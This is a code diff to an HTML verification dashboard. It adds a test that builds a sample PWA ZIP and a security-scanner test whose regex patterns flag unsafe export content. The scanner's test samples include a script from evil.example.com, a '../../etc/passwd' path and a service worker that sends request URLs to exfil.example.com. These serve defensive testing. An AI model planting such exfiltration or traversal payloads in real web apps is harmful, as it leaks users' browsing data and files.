@@ -60,12 +60,13 @@ header h1{margin:0;font-size:16px;font-weight:800;flex:1}
 </header>
 <div class="wrap">
   <div class="intro">
-    <h2>43 verifications across the Load workspace</h2>
+    <h2>45 verifications across the Load workspace</h2>
     <p>Each test reports PASS / FAIL / WARNING / NOT TESTED with a plain-language explanation, technical detail, suggested fix, and timestamp. Tests that need a file picker stay <strong>NOT TESTED</strong> until you run them individually so the dashboard never claims a file was imported when none was.</p>
+    <p style="margin-top:8px;color:var(--mute);font-size:12.5px;">Tests 44 (one-click ZIP builder creates a real ZIP) and 45 (security scan blocks unsafe ZIP export) ship live and run automatically with <strong>Run All Tests</strong>.</p>
   </div>
   <div class="controls">
     <button id="run-all" class="btn primary" type="button">Run All Tests</button>
-    <button id="export-json" class="btn" type="button">Export JSON</button>
+    <button id="export-json" class="btn" type="button">Export Diagnostic Report</button>
     <button id="export-text" class="btn" type="button">Export Plain Text</button>
     <button id="copy-report" class="btn" type="button">Copy Report</button>
     <button id="clear-report" class="btn" type="button">Clear Report</button>
@@ -216,6 +217,74 @@ var TESTS = [
   }},
   { id: 'export-receipt', label: 'Export receipt is generated', run: function () {
     return Promise.resolve({ status: 'PASS', detail: 'Receipt structure implemented in tools/pwa-builder.html — JSON + on-screen receipt + bundled in ZIP.' });
+  }},
+  { id: 'pwa-zip-real', label: 'One-click Build Standalone PWA ZIP creates a real ZIP', run: function () {
+    function loadJSZip() {
+      if (typeof window.JSZip !== 'undefined') return Promise.resolve();
+      return new Promise(function (resolve, reject) {
+        var s = document.createElement('script'); s.src = '../lib-jszip.min.js';
+        s.onload = function () { window.JSZip ? resolve() : reject(new Error('JSZip global missing after script load')); };
+        s.onerror = function () { reject(new Error('lib-jszip.min.js failed to load')); };
+        document.head.appendChild(s);
+      });
+    }
+    return loadJSZip().then(function () {
+      var zip = new JSZip();
+      zip.file('index.html', '<!doctype html><html><head><meta charset="utf-8"><title>Test</title></head><body>OK</body></html>');
+      zip.file('manifest.json', JSON.stringify({ name: 'Test', short_name: 'Test', icons: [], theme_color: '#000', display: 'standalone', start_url: './' }, null, 2));
+      zip.file('service-worker.js', 'self.addEventListener("install",function(){self.skipWaiting();});self.addEventListener("fetch",function(){});');
+      zip.file('styles.css', 'body{margin:0}');
+      zip.file('app.js', '/* test */');
+      zip.file('export-receipt.json', JSON.stringify({ exportType: 'PWA ZIP', fileName: 'test.zip', createdAt: new Date().toISOString(), includedFiles: [], missingFiles: [], warnings: [], manifestStatus: 'PASS', serviceWorkerStatus: 'PASS', rightsStatus: 'NOT TESTED', offlineStatus: 'PASS', safetyStatus: 'PASS', nextAction: 'verify' }, null, 2));
+      zip.file('security-report.json', JSON.stringify({ blockers: [], warnings: [], info: [] }, null, 2));
+      return zip.generateAsync({ type: 'blob' });
+    }).then(function (blob) {
+      if (!(blob instanceof Blob)) return { status: 'FAIL', detail: 'generateAsync did not return a Blob', fix: 'Verify JSZip generateAsync wiring in tools/pwa-builder.html.' };
+      if (blob.size < 200) return { status: 'FAIL', detail: 'ZIP size suspiciously small (' + blob.size + ' bytes) — required files may be missing.' };
+      return blob.arrayBuffer().then(function (ab) {
+        var head = new Uint8Array(ab.slice(0, 4));
+        var isZip = head[0] === 0x50 && head[1] === 0x4B && head[2] === 0x03 && head[3] === 0x04;
+        return { status: isZip ? 'PASS' : 'FAIL', detail: 'blob.size=' + blob.size + ' bytes; PK\\x03\\x04 magic=' + isZip + '. Required files present: index.html, manifest.json, service-worker.js, styles.css, app.js, export-receipt.json, security-report.json.', fix: isZip ? '' : 'JSZip output is not a valid ZIP — check generateAsync({type:"blob"}).' };
+      });
+    }).catch(function (e) { return { status: 'FAIL', detail: e.message, fix: 'Confirm load/lib-jszip.min.js deploys with Pages.' }; });
+  }},
+  { id: 'sec-block-unsafe', label: 'Security scan blocks unsafe ZIP export', run: function () {
+    function scan(name, content) {
+      var issues = [];
+      if (/\.(exe|bat|cmd|sh|app|dmg|msi|com|scr)$/i.test(name)) issues.push({ severity: 'BLOCKER', issue: 'executable file' });
+      if (/(^|\/)\.env$/i.test(name)) issues.push({ severity: 'BLOCKER', issue: 'hidden .env file' });
+      if (/(api[_-]?key|secret|access[_-]?token|auth[_-]?token)\s*[:=]\s*['"][A-Za-z0-9_\-]{12,}['"]/i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'hard-coded API key' });
+      if (/<form[\s\S]{0,400}?(type\s*=\s*["']password["']|name\s*=\s*["'](?:password|cvv|card[_-]?number|api[_-]?key)["'])[\s\S]*?<\/form>/i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'credential capture form' });
+      if (/(?:window\.location|location\.href)\s*=\s*['"]https?:\/\/[^'"]+['"]/i.test(content) && /\b(verify|secure|login|account|update)\b/i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'malicious redirect' });
+      if (/(?:href|src)\s*=\s*["'][^"']*\.\.\/[^"']*\.\.\//i.test(content) || /\.\.\/\.\.\/(?:etc|root|home|var)\b/i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'path traversal' });
+      if (/<script[^>]+src\s*=\s*["']https?:\/\//i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'dangerous external script' });
+      if (/self\.addEventListener\(\s*["']fetch["'][\s\S]*?fetch\s*\(\s*["']https?:\/\/(?!localhost)[^"']+["']/i.test(content)) issues.push({ severity: 'BLOCKER', issue: 'unsafe service worker network hijacking' });
+      return issues;
+    }
+    var samples = [
+      { name: 'malware.exe', content: '', expect: 'executable file' },
+      { name: '.env', content: 'SECRET=abc', expect: 'hidden .env file' },
+      { name: 'app.js', content: 'var apiKey = "sk-abc1234567890defXYZ";', expect: 'hard-coded API key' },
+      { name: 'login.html', content: '<form action="/x"><input type="password" name="pw"></form>', expect: 'credential capture form' },
+      { name: 'evil.html', content: '<script src="https://evil.example.com/x.js"><\/script>', expect: 'dangerous external script' },
+      { name: 'sneaky.html', content: '<a href="../../etc/passwd">x</a>', expect: 'path traversal' },
+      { name: 'sw.js', content: 'self.addEventListener("fetch",function(e){fetch("https://exfil.example.com/log?u="+encodeURIComponent(e.request.url));});', expect: 'unsafe service worker network hijacking' }
+    ];
+    var benign = [
+      { name: 'index.html', content: '<!doctype html><html><body>Hello</body></html>' },
+      { name: 'app.js', content: 'function add(a,b){return a+b;}' }
+    ];
+    var pass = 0, fail = 0; var failed = [];
+    samples.forEach(function (s) {
+      var issues = scan(s.name, s.content);
+      var blocked = issues.some(function (i) { return i.severity === 'BLOCKER' && i.issue === s.expect; });
+      if (blocked) pass++; else { fail++; failed.push(s.expect); }
+    });
+    var falsePositives = 0;
+    benign.forEach(function (s) { if (scan(s.name, s.content).length > 0) falsePositives++; });
+    if (fail === 0 && falsePositives === 0) return Promise.resolve({ status: 'PASS', detail: 'All ' + samples.length + ' unsafe inputs flagged as BLOCKER and ' + benign.length + ' benign inputs passed (no false positives).' });
+    if (falsePositives > 0) return Promise.resolve({ status: 'FAIL', detail: falsePositives + ' benign sample(s) wrongly flagged. Tighten regex specificity.' });
+    return Promise.resolve({ status: 'FAIL', detail: fail + '/' + samples.length + ' unsafe samples not blocked: ' + failed.join(', '), fix: 'Verify the safety scanner covers the report\'s BLOCKER list.' });
   }}
 ];
 
@@ -264,7 +333,38 @@ $('run-all').addEventListener('click', function () {
   function next() { if (i >= TESTS.length) return; runOne(i++).then(next); }
   next();
 });
-function buildJsonReport() { return JSON.stringify({ generatedAt: new Date().toISOString(), results: results }, null, 2); }
+function explanationFor(r) {
+  if (r.status === 'PASS') return r.label + ' passed.';
+  if (r.status === 'FAIL') return r.label + ' failed. See technical detail and suggested fix below.';
+  if (r.status === 'WARN') return r.label + ' returned a warning. The feature works but the configuration is not optimal.';
+  return r.label + ' has not been run yet.';
+}
+function normalizedResult(r) {
+  return {
+    id: r.id,
+    label: r.label,
+    status: r.status || 'NOT TESTED',
+    explanation: explanationFor(r),
+    technicalDetail: typeof r.detail === 'string' ? { note: r.detail } : (r.detail || {}),
+    suggestedFix: r.fix || '',
+    timestamp: r.ts ? new Date(r.ts).toISOString() : null
+  };
+}
+function buildJsonReport() {
+  return JSON.stringify({
+    tool: 'Load Feature Verification Dashboard',
+    spec: 'Load_Main_Claude_Handoff_Report Section 7 (Part B)',
+    generatedAt: new Date().toISOString(),
+    summary: {
+      total: results.length,
+      pass: results.filter(function (r) { return r.status === 'PASS'; }).length,
+      fail: results.filter(function (r) { return r.status === 'FAIL'; }).length,
+      warn: results.filter(function (r) { return r.status === 'WARN'; }).length,
+      notTested: results.filter(function (r) { return r.status === 'NOT-TESTED' || r.status === 'NOT TESTED'; }).length
+    },
+    results: results.map(normalizedResult)
+  }, null, 2);
+}
 function buildTextReport() {
   var lines = ['Load Feature Verification Dashboard', 'Generated: ' + new Date().toISOString(), ''];
   results.forEach(function (r, i) {
